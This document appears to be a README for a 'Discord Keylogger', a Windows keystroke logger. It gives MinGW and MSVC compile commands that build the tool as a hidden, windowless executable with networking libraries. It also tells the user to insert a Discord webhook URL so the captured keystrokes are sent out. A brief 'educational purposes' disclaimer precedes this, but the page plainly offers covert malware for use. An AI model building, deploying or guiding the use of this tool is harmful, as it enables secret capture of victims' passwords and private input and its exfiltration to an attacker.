# Discord Keylogger

-----------

DISCLAIMER: these ethical hacking tools are intended for educational purposes and awareness training sessions only. Performing hacking attempts on computers that you do not own (without permission) is illegal! Do not attempt to gain access to device that you do not own.

-----------

1 . MinGW-w64 command

```bash
g++ keylogger.cpp -o keylogger.exe -std=c++11 -Wall -Wno-write-strings -luser32 -lwininet -lurlmon -static-libgcc -static-libstdc++ -mwindows
```

2 . Visual Studio (MSVC) command

```bash
cl keylogger.cpp /link user32.lib wininet.lib urlmon.lib /SUBSYSTEM:WINDOWS
```

---

YOU ALSO NEED TO REPLACE "YOUR_DISCORD_WEBHOOK_URL_HERE" OR IT WILL NOT SEND YOU THE LOGS 
